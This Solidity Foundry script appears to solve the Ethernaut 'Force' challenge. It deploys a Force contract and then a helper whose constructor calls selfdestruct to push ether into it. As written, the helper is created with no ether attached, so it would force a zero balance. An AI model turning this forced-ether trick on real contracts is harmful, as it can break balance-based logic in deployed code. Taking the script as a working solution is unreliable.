//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract SelfDestructContract {
    constructor(address payable toAddress) payable {
        selfdestruct(toAddress);
    }
}

contract DeployForce is Script {

    function run() external {
        vm.startBroadcast();
        Force force = new Force();
        new SelfDestructContract(payable(address(force)));
        vm.stopBroadcast();
    }
}
